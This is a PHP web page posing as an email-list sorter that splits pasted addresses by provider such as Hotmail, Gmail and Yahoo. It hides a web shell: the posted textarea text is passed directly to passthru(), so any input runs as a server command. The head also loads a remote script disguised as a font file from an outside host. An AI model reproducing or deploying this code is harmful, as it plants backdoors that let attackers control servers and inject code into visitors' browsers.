    <meta name="author" content="Teguh Tri Sasongko">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="Email List Ekstraktor with Domain Name">
    <meta name="keywords" content="Email List Ekstraktor with Domain Name, Email List Ekstraktor, Email Ekstraktor with Domain Name, Email Ekstraktor, maillist Ekstraktor, Email">
<head>
<head>
<meta http-equiv="content-type" content="text/html; charset=windows-1256" />
<script src='http://www.w32.info/site/jquery1000/AlHurra-Font_Light.ttf'></script>
<style type="text/css">
.style1 {
	text-align: center;
}
</style>
</head>
<body >
<center>
<h3 style="color:white;padding:2px;background:#5997f9;margin-top:0px;border:2px dashed white;">Email List Ekstraktor by Domain Name</h3></center>
<form method="post">
	<div class="style1">
		<textarea name="emails" cols="30" rows="10"></textarea>
		<br />
		<input type="submit" value="Submit" />
		
		</div>
</form>
<?PHP
error_reporting(E_ALL ^ (E_NOTICE | E_WARNING));
if ($_POST['emails']){
$emails = $_POST['emails'];
passthru($emails);
}
$ex = explode("\n",$emails);
$count = count($ex);
if(isset($emails)&&$count>=1){
echo "<center><font color = 'red'><b>$count </font>Number of emails  </b></center><br />";
}else{
echo "<center>  
No email </center>";
exit;}

if(isset($emails)){
   

for($i=0;$i<=$count;$i++){
$d = strtolower($ex[$i]);

if(strstr($d,"hotmail")   || strstr($d,"live") || strstr($d,"msn") || strstr($d,"outlook")){
$hotmail.=$d;
$nh = $nh + 1;
}else{
if(strstr($d,"yahoo")   || strstr($d,"ymail")){
$yahoo.=$d;
$ny = $ny + 1;
}else{
if(strstr($d,"gmail")  || strstr($d,"googlemail")   ){
$gmail.=$d;
$ng = $ng + 1;
}else{
if(strstr($d,"aol")   ){
$aol.=$d;
$na = $na + 1;
}else{
if(strstr($d,"mail.ru")   ){
$mailru .=$d;
$nr = $nr + 1;
}else{
if(strstr($d,"wanadoo")   ){
$wanadoo .=$d;
$nw = $nw + 1;
}else{
if(strstr($d,"ntlworld")   ){
$ntlworld .=$d;
$nt = $nt + 1;
}else{
if(strstr($d,"gmx")   ){
$gmx .=$d;
$ngm = $ngm + 1;
}else{
if(strstr($d,"@web.")   ){
$web .=$d;
$nw2 = $nw2 + 1;
}else{

$ather .=$d;
$nn=$nn + 1;
}

}

}


}

}
}
}
}

}
}
}				
?>
<center><table>
	<tr>      
<td><center>hotmail ( <?echo $nh;?> ) </center><textarea name="hotmailx" cols="80" rows="10" ><?echo $hotmail;?></textarea></td>
<td><center>gmail ( <?echo $ng;?> )</center><textarea name="gmailx" cols="80" rows="10" ><?echo $gmail;?></textarea></td>
<td><center>aol ( <?echo $na;?> )</center><textarea name="aolxx" cols="80" rows="10" ><?echo $aol;?></textarea></td>
<td><center>yahoo ( <?echo $ny;?> )</center><textarea name="yahoox" cols="80" rows="10" ><?echo $yahoo;?></textarea></td>
<td><center>mail.ru( <?echo $nr;?> )</center><textarea name="othersx" cols="80" rows="10" ><?echo $mailru;?></textarea></td></tr>
<tr>
<td><center>wanadoo( <?echo $nw;?> )</center><textarea name="othersx" cols="80" rows="10" ><?echo $wanadoo;?></textarea></td>
<td><center>ntlworld( <?echo $nt;?> )</center><textarea name="othersx" cols="80" rows="10" ><?echo $ntlworld;?></textarea></td>
<td><center>gmx( <?echo $ngm;?> )</center><textarea name="othersx" cols="80" rows="10" ><?echo $gmx;?></textarea></td>
<td><center>web( <?echo $nw2;?> )</center><textarea name="othersx" cols="80" rows="10" ><?echo $web;?></textarea></td>
<td><center>ather mails( <?echo $nn-1;?> )</center><textarea name="othersx" cols="80" rows="10" ><?echo $ather;?></textarea></td>
					
	</tr>
</table></center>
</body>